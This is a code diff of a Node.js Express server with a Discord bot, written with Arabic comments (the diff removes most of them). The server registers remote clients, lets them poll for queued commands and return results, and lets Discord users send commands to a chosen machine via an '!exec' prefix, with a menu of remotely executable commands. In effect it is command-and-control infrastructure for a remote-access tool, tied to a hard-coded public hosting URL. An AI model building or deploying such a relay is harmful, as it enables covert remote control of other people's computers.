@@ -18,12 +18,11 @@ const PORT = process.env.PORT || 3000;
 const app = express();
 app.use(bodyParser.json());
 
-const pendingCommands = {};      // { clientId: [ { id, cmd } ] }
+const pendingCommands = {};
 const commandResults = {};
 let cmdCounter = 0;
-const clients = {};              // { clientId: { hostname, lastSeen } }
+const clients = {};
 
-// تسجيل العميل
 app.post('/register', (req, res) => {
     const { clientId, hostname } = req.body;
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
@@ -32,7 +31,6 @@ app.post('/register', (req, res) => {
     res.json({ status: 'registered' });
 });
 
-// استطلاع الأوامر المعلقة
 app.get('/poll/:clientId', (req, res) => {
     const clientId = req.params.clientId;
     if (clients[clientId]) clients[clientId].lastSeen = Date.now();
@@ -42,14 +40,12 @@ app.get('/poll/:clientId', (req, res) => {
     res.json({ id: cmdObj.id, command: cmdObj.cmd });
 });
 
-// استلام نتيجة تنفيذ أمر
 app.post('/result', (req, res) => {
     const { id, result } = req.body;
     commandResults[id] = result;
     res.json({ status: 'ok' });
 });
 
-// إرسال أمر من البوت إلى عميل معين
 app.post('/send', (req, res) => {
     const { clientId, command } = req.body;
     if (!clientId || !command) return res.status(400).json({ error: 'Missing data' });
@@ -59,14 +55,12 @@ app.post('/send', (req, res) => {
     res.json({ status: 'queued', id });
 });
 
-// جلب نتيجة أمر سابق
 app.get('/result/:id', (req, res) => {
     const result = commandResults[req.params.id];
     if (result) res.json({ result });
     else res.status(404).json({ error: 'Not found' });
 });
 
-// قائمة الأجهزة المتصلة
 app.get('/clients', (req, res) => {
     const now = Date.now();
     const online = {};
@@ -81,7 +75,7 @@ const client = new Client({
     intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
 });
 
-const userTargets = new Map();   // userId -> targetClientId
+const userTargets = new Map();
 
 client.on('messageCreate', async (msg) => {
     if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
@@ -169,7 +163,7 @@ client.on('messageCreate', async (msg) => {
         return;
     }
 
-    // === الأمر الجديد لعرض قائمة الأوامر القابلة للتنفيذ ===
+    // === أمر عرض قائمة الأوامر القابلة للتنفيذ على الجهاز البعيد ===
     if (cmd === 'exec-commands' || cmd === 'exec-help') {
         const commandsList = `
 **📋 قائمة الأوامر التي يمكن تنفيذها عبر !exec:**
@@ -218,24 +212,20 @@ client.on('messageCreate', async (msg) => {
     }
 });
 
-// حدث جاهزية البوت
 client.once('clientReady', () => {
     console.log(`✅ البوت يعمل باسم ${client.user.tag}`);
 });
 
-// تسجيل الدخول
 client.login(TOKEN).catch(err => {
     console.error('❌ فشل تسجيل الدخول:', err);
     process.exit(1);
 });
 
-// تشغيل خادم Express
-const server = app.listen(PORT, '0.0.0.0', () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ الخادم الوسيط يعمل على المنفذ ${PORT}`);
-    console.log(`🌐 الرابط العام: https://remote-production-b44f.up.railway.app`); // غيّر حسب رابطك
+    console.log(`🌐 الرابط العام: https://remote-production-b44f.up.railway.app`);
 });
 
-// معالجة الأخطاء غير المتوقعة
 process.on('uncaughtException', (err) => {
     console.error('⚠️ استثناء غير معالج:', err);
 });
